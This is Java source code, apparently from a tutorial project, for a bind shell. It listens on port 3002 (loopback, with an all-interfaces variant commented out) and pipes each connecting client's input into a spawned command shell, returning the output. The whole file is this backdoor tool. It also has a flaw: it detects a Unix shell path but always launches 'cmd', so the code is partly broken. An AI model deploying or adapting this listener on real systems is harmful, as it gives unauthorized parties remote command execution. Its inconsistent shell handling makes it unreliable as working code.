package com.melardev.shell;

import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;

public class BindShell {
    public static void main(String[] args) {


        String shellPath = getShellPath();
        if (shellPath == null) {
            System.err.println("Could not locate the shell executable path");
            return;
        }

        // ServerSocket serverSocket = new ServerSocket(3002); // Will bind to all interfaces
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket();

            serverSocket.setReuseAddress(true);
            serverSocket.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), 3002));
        } catch (IOException e) {
            e.printStackTrace();
            System.exit(1);
        }

        while (true) {
            try {

                Socket socket = serverSocket.accept();

                System.out.println("Client received");

                InputStream socketIs = socket.getInputStream();
                OutputStream socketOut = socket.getOutputStream();

                ProcessBuilder pb = new ProcessBuilder();
                // merge STDERR with STDOUT
                pb.redirectErrorStream(true);
                pb.redirectInput(ProcessBuilder.Redirect.PIPE);
                pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

                Process process = pb.command("cmd").start();
                OutputStream outputStream = process.getOutputStream();
                InputStream inputStream = process.getInputStream();

                readFromSocketWriteIntoProcessAsync(socketIs, outputStream);
                readFromProcessWriteIntoSocket(inputStream, socketOut);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static void readFromSocketWriteIntoProcessAsync(InputStream socketIs, OutputStream outputStream) {
        new Thread(() -> {
            try {
                // Read from socket, write into process
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));
                byte[] bufferSocket = new byte[1024];
                int numberOfBytesReadFromSocket = 0;
                while ((numberOfBytesReadFromSocket = socketIs.read(bufferSocket)) != -1) {
                    outputStream.write(bufferSocket, 0, numberOfBytesReadFromSocket);
                    writer.newLine();
                    writer.flush(); // Very important
                }
            } catch (IOException e) {
                e.printStackTrace();
                try {
                    socketIs.close();
                } catch (IOException ex) {
                    System.exit(1);
                }
                try {
                    outputStream.close();
                } catch (IOException ex) {
                    System.exit(1);
                }
            }
        }).start();
    }

    private static void readFromProcessWriteIntoSocket(InputStream inputStream, OutputStream socketOut) throws IOException {
        byte[] buffer = new byte[1024];
        int numberOfBytesRead = 0;
        while ((numberOfBytesRead = inputStream.read(buffer)) != -1) {
            socketOut.write(buffer, 0, numberOfBytesRead);
            socketOut.flush();
        }
    }

    private static String getShellPath() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.startsWith("windows"))
            return "cmd.exe";
        else {
            String[] shellLocations = {
                    "/bin/bash", "/bin/sh", "/bin/csh", "/bin/ksh"
            };
            for (String shellLocation : shellLocations) {
                File shell = new File(shellLocation);
                if (shell.exists())
                    return shell.getAbsolutePath();
            }
        }
        return null;
    }
}
